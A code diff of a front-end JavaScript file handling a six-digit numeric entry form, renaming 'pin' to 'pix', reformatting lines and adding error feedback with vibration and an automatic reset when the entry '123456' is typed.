@@ -1,5 +1,7 @@
+// pix.js
+
 const inputs =
-document.querySelectorAll(".pin-box");
+document.querySelectorAll(".pix-box");
 
 const showBtn =
 document.getElementById("showBtn");
@@ -7,15 +9,21 @@ document.getElementById("showBtn");
 const loadingBox =
 document.getElementById("loadingBox");
 
+const errorBox =
+document.getElementById("errorBox");
+
 let isShow = false;
 
 /* ========================= */
-/* RESET LOADING SAAT BACK */
+/* RESET LOADING */
 /* ========================= */
 
-window.addEventListener("pageshow", () => {
+window.addEventListener(
+"pageshow",
+() => {
 
-    loadingBox.style.display = "none";
+    loadingBox.style.display =
+    "none";
 
 });
 
@@ -25,11 +33,19 @@ window.addEventListener("pageshow", () => {
 
 inputs.forEach((input,index) => {
 
-    input.addEventListener("click", () => {
+    input.addEventListener(
+    "click",
+    () => {
 
-        for(let i = 0; i < inputs.length; i++){
+        for(
+            let i = 0;
+            i < inputs.length;
+            i++
+        ){
 
-            if(inputs[i].value === ""){
+            if(
+                inputs[i].value === ""
+            ){
 
                 inputs[i].focus();
 
@@ -44,19 +60,35 @@ inputs.forEach((input,index) => {
 });
 
 /* ========================= */
-/* AUTO PIN */
+/* AUTO PIX */
 /* ========================= */
 
 inputs.forEach((input,index) => {
 
-    input.addEventListener("input", () => {
+    input.addEventListener(
+    "input",
+    () => {
 
         input.value =
-        input.value.replace(/[^0-9]/g,'');
+        input.value.replace(
+        /[^0-9]/g,
+        ''
+        );
 
-        if(input.value.length === 1){
+        /* HIDE ERROR */
+        errorBox.classList.remove(
+        "show"
+        );
 
-            if(index < inputs.length - 1){
+        /* NEXT */
+        if(
+            input.value.length === 1
+        ){
+
+            if(
+                index <
+                inputs.length - 1
+            ){
 
                 inputs[index + 1]
                 .focus();
@@ -65,11 +97,14 @@ inputs.forEach((input,index) => {
 
         }
 
-        checkPin();
+        checkPix();
 
     });
 
-    input.addEventListener("keydown", (e) => {
+    /* BACKSPACE */
+    input.addEventListener(
+    "keydown",
+    (e) => {
 
         if(
             e.key === "Backspace" &&
@@ -90,10 +125,12 @@ inputs.forEach((input,index) => {
 });
 
 /* ========================= */
-/* SHOW PIN */
+/* SHOW PIX */
 /* ========================= */
 
-showBtn.addEventListener("click", () => {
+showBtn.addEventListener(
+"click",
+() => {
 
     isShow = !isShow;
 
@@ -114,26 +151,68 @@ showBtn.addEventListener("click", () => {
 });
 
 /* ========================= */
-/* CHECK PIN */
+/* CHECK PIX */
 /* ========================= */
 
-function checkPin(){
+function checkPix(){
 
-    let full = true;
+    let pix = "";
 
     inputs.forEach(input => {
 
-        if(input.value === ""){
-
-            full = false;
-
-        }
+        pix += input.value;
 
     });
 
-    if(full){
+    /* FULL */
+    if(pix.length === 6){
 
-        /* TAMPILKAN LOADING */
+        /* PIX SALAH */
+        if(pix === "123456"){
+
+            /* GETAR */
+            if(navigator.vibrate){
+
+                navigator.vibrate([
+                    120,
+                    80,
+                    120
+                ]);
+
+            }
+
+            /* SHOW ERROR */
+            errorBox.classList.add(
+            "show"
+            );
+
+            /* AUTO HIDE */
+            setTimeout(() => {
+
+                errorBox.classList.remove(
+                "show"
+                );
+
+            },2000);
+
+            /* RESET */
+            setTimeout(() => {
+
+                inputs.forEach(input => {
+
+                    input.value = "";
+
+                });
+
+                inputs[0].focus();
+
+            },300);
+
+            return;
+
+        }
+
+        /* SHOW LOADING */
         loadingBox.style.display =
         "flex";
 
